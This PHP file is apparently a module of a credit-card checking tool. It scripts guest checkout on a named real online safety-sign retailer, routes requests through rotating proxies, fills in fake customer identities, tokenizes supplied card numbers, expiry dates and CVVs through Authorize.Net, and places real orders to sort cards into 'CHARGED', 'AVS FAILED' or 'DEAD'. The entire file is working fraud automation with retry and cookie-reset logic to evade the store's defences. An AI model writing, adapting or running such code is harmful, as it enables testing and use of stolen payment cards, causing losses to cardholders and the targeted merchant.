<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://www.strongholdsafety.com/danray-safety-sign-bench-grinder-openings-11.html', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$checkout_url = $this->getstr($this->getstr($r1->body, '<form data-product-sku="', ' method'), 'action="', '"');

if (empty($checkout_url)) {
	$retry++;
	goto start;
}

$form_key = trim(strip_tags($this->getstr($r1->body, '<input name="form_key" type="hidden" value="', '"')));

if (empty($form_key)) {
	$retry++;
	goto start;
}

$data = 'product=94&selected_configurable_option=&related_product=&form_key='.$form_key.'&qty=1';

$headers = [
	'cookie: go=go; form_key='.$form_key
];

$r2 = $this->curlx->Post($checkout_url, $data, $headers, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$mage_err = isset($r2->headers->response['Set-Cookie']) ? getStr(urldecode(getStr($r2->headers->response['Set-Cookie'], 'mage-messages=', ';')), 'error","text":"', '"') : '';

if (!empty($mage_err)) {
	$empty = $mage_err;

	goto start;
}

$r3 = $this->curlx->Get('https://www.strongholdsafety.com/checkout/', null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$entity_id = trim(strip_tags($this->getstr($r3->body, 'entity_id":"', '"')));

if (empty($entity_id)) {
	$empty = 'Third Request Token is Empty';

	goto start;
}

$clientKey = $this->getstr($r3->body, '"clientKey":"', '"');

$apiLoginId = $this->getstr($r3->body, '"apiLoginId":"', '"');

if (empty($clientKey) || empty($apiLoginId)) {
	$empty = 'Third Request Tokens is Empty';

	goto start;
}

$data = '{"addressInformation":{"shipping_address":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["12 main street"],"company":"Company","telephone":"2564567654","postcode":"10509","city":"Brewster","firstname":"'.$fake->first.'","lastname":"'.$fake->last.'","extension_attributes":{"shipperhq_option_values":{"destination_type":"","inside_delivery":"0","liftgate_required":"0","limited_delivery":"0","notify_required":"0","customer_carrier":"","customer_carrier_ph":"","customer_carrier_account":""}}},"billing_address":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["12 main street"],"company":"Company","telephone":"2564567654","postcode":"10509","city":"Brewster","firstname":"Jhon","lastname":"Doe","extension_attributes":{"shipperhq_option_values":{"destination_type":"","inside_delivery":"0","liftgate_required":"0","limited_delivery":"0","notify_required":"0","customer_carrier":"","customer_carrier_ph":"","customer_carrier_account":""}},"saveInAddressBook":null},"shipping_method_code":"GND","shipping_carrier_code":"shqups","extension_attributes":{}}}';

$headers = [
	'content-type: application/json',
	'x-requested-with: XMLHttpRequest'
];

$r4 = $this->curlx->Post('https://www.strongholdsafety.com/rest/default/V1/guest-carts/'.$entity_id.'/shipping-information', $data, $headers, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$data = '{"securePaymentContainerRequest":{"merchantAuthentication":{"name":"'.$apiLoginId.'","clientKey":"'.$clientKey.'"},"data":{"type":"TOKEN","id":"'.substr($fake->guid, 0, -6).'","token":{"cardNumber":"'.$cc.'","expirationDate":"'.$mm.''.$yyyy.'","cardCode":"'.$cvv.'"}}}}';

$headers = [
	'content-type: application/json; charset=UTF-8'
];

$r5 = $this->curlx->Post('https://api2.authorize.net/xml/v1/request.api', $data, $headers, $cookie, $server['proxy']);

if (!$r5->success) goto start;

if (strpos($r5->body, 'resultCode":"Error') !== false) {
	$err = empty($tmp = $this->getstr($r5->body, 'text":"', '"')) ? 'Unknown Error' : $tmp;

	$status = ['status' => 'DECLINED', 'emoji' => '❌', 'msg' => "DEAD - $err!"];

	goto end;
}

$dataValue = $this->getstr($r5->body, 'dataValue":"', '"');

if (empty($dataValue)) {
	$empty = 'Fifth Request Token is Empty';

	goto start;
}

$cc_type = ([
	'3' => 'AE',
	'4' => 'VI',
	'5' => 'MC',
	'6' => 'DI'
])[substr($cc, 0, 1)];

$data = '{"cartId":"'.$entity_id.'","billingAddress":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["12 main street"],"company":"Company","telephone":"2564567654","postcode":"10509","city":"Brewster","firstname":"'.$fake->first.'","lastname":"'.$fake->last.'","extension_attributes":{"shipperhq_option_values":{"destination_type":"","inside_delivery":"0","liftgate_required":"0","limited_delivery":"0","notify_required":"0","customer_carrier":"","customer_carrier_ph":"","customer_carrier_account":""}},"saveInAddressBook":null,"custom_attributes":{}},"paymentMethod":{"method":"authnetcim","additional_data":{"save":false,"cc_type":"'.$cc_type.'","cc_exp_year":"'.$yyyy.'","cc_exp_month":"'.$m.'","cc_cid":"'.$cvv.'","card_id":null,"acceptjs_key":"COMMON.ACCEPT.INAPP.PAYMENT","acceptjs_value":"'.$dataValue.'","cc_last4":"'.$last4.'","cc_bin":"'.substr($cc, 0, 6).'"}},"email":"'.$fake->email.'"}';

$headers = [
	'content-type: application/json',
	'x-requested-with: XMLHttpRequest'
];

$r6 = $this->curlx->Post('https://www.strongholdsafety.com/rest/default/V1/guest-carts/'.$entity_id.'/payment-information', $data, $headers, $cookie, $server['proxy']);

if (!$r6->success) goto start;

$json_r6 = json_decode($r6->body);

$msg = $json_r6->message ?? '';

if (empty($msg)) {
	$r7 = $this->curlx->Get('https://www.strongholdsafety.com/checkout/onepage/success/', null, $cookie, $server['proxy']);

	$ordernum = $this->getstr($r7->body, 'Your order # is: <span>', '<');

	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CHARGED - This transaction has been approved. ({$ordernum})"];

	goto end;
}

$msg = trim(str_replace('Authorize.Net CIM Gateway: Transaction failed.', '', $msg));

if (strpos($r6->body, 'success":true') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => 'CHARGED - This transaction has been approved.'];
} elseif (strpos($r6->body, 'AVS') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "AVS FAILED - $msg!"];
} else {
	$msg = empty($msg) ? 'Unknown Error' : $msg;

	$status = ['status' => 'DECLINED', 'emoji' => '❌', 'msg' => "DEAD - $msg"];
}

end: